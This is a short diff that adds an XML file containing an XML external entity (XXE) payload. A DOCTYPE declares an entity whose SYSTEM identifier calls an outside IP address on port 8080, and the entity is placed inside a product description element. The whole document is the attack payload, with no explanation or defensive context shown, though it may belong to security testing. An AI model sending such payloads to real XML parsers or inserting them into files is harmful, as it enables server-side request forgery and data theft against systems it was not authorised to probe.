@@ -1,0 +1,4 @@
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://18.189.195.244:8080"> ]>
+<product id="1">
+    <description>&xxe;</description>
+</product>
